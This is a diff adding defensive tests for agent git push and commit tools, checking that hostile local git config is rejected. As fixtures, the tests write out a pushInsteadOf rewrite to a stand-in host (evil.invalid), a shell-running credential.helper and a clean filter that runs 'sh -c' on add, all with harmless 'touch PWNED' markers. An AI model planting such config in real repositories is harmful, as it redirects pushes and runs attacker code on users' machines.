@@ -372,3 +372,53 @@ describe("URL credential redaction", () => {
     ).not.toContain("TOPSECRET")
   })
 })
+
+describe("local git config hardening", () => {
+  test("rejects a push when the workspace pins url.*.pushInsteadOf (pinning bypass)", async () => {
+    const { workRepo, bareRemote } = makeRepos()
+    // Without the guard, this rewrites the pinned URL → the push goes elsewhere.
+    git(workRepo, ["config", "--local", "url.https://evil.invalid/.pushInsteadOf", bareRemote])
+    const tool = makeGitPushTool({
+      workspaceRoot: workRepo,
+      remotes: { origin: bareRemote },
+      credential: { kind: "none" },
+    })
+    await expect(tool.execute({ branch: "main" }, CTX)).rejects.toThrow(/local git config/)
+    // Nothing reached the pinned remote.
+    expect(git(bareRemote, ["for-each-ref", "--format=%(refname)"]).trim()).toBe("")
+  })
+
+  test("rejects a push when the workspace sets credential.helper", async () => {
+    const { workRepo, bareRemote } = makeRepos()
+    git(workRepo, ["config", "--local", "credential.helper", "!touch PWNED"])
+    const tool = makeGitPushTool({
+      workspaceRoot: workRepo,
+      remotes: { origin: bareRemote },
+      credential: { kind: "none" },
+    })
+    await expect(tool.execute({ branch: "main" }, CTX)).rejects.toThrow(/local git config/)
+  })
+
+  test("rejects a commit when the workspace defines a clean filter (code exec on add)", async () => {
+    const { workRepo } = makeRepos()
+    git(workRepo, ["config", "--local", "filter.evil.clean", "sh -c 'touch PWNED'"])
+    writeFileSync(join(workRepo, "x.ts"), "export const z = 1\n")
+    const tool = makeGitCommitTool({ workspaceRoot: workRepo })
+    await expect(tool.execute({ message: "c" }, CTX)).rejects.toThrow(/local git config/)
+  })
+
+  test("a clean repo still commits and pushes", async () => {
+    const { workRepo, bareRemote } = makeRepos()
+    writeFileSync(join(workRepo, "ok.ts"), "export const ok = 1\n")
+    expect(
+      (await makeGitCommitTool({ workspaceRoot: workRepo }).execute({ message: "ok" }, CTX))
+        .committed,
+    ).toBe(true)
+    const out = await makeGitPushTool({
+      workspaceRoot: workRepo,
+      remotes: { origin: bareRemote },
+      credential: { kind: "none" },
+    }).execute({ branch: "main" }, CTX)
+    expect(out.pushed).toBe(true)
+  })
+})
